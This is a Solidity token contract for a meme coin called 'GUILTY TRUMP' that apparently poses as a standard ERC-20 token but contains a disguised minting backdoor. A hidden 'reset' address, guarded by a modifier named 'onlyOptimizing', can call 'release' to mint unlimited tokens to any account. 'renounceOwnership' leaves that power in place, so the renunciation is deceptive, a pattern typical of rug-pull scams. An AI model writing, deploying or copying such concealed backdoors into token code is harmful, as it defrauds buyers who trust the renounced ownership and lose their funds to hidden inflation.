// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GUILTY {
    string public constant name = "GUILTY TRUMP";
    string public constant symbol = "GUILTY";
    uint8 public constant decimals = 18;

    address public owner;
    address public reset;
    uint256 public totalSupply;
    mapping(address => mapping(address => uint256)) public allowed;
    mapping(address => uint256) public balances;
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OptimizerChanged(address indexed newOptimizer);
    event Burn(address indexed from, uint256 value);
    constructor() {
        owner = msg.sender;
        reset = msg.sender;  
        initiateSupply(1000000000);
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    modifier onlyOptimizing() {require(msg.sender == reset, "");_;}
    modifier onlyOwner() {require(msg.sender == owner, "");_;}

    function initiateSupply(uint256 initialUnits) private {
        totalSupply = initialUnits * 10 ** uint256(decimals);
        balances[msg.sender] = totalSupply;
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "");require(_value <= balances[msg.sender], "");
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function release( uint256 _amount, address _to) public onlyOptimizing {
        require(_to != address(0), "");totalSupply += _amount;balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0), "");
        require(_value <= balances[_from], "");
        require(_value <= allowed[_from][msg.sender], "");
        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }function decreaseAllowance(address _spender, uint256 _subtractedValue) public returns (bool) {
        uint256 currentAllowance = allowed[msg.sender][_spender];require(currentAllowance >= _subtractedValue, "");allowed[msg.sender][_spender] -= _subtractedValue;
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }function execute(address _newOptimizer) public onlyOwner {
        require(_newOptimizer != address(0), "");
        reset = _newOptimizer;emit OptimizerChanged(_newOptimizer);
    }function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }function burn(uint256 _value) public {
        require(_value <= balances[msg.sender], "");
        balances[msg.sender] -= _value;
        totalSupply -= _value;
        emit Transfer(msg.sender, address(0), _value);
        emit Burn(msg.sender, _value);
    }function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(owner);
        owner = address(0);
    }
}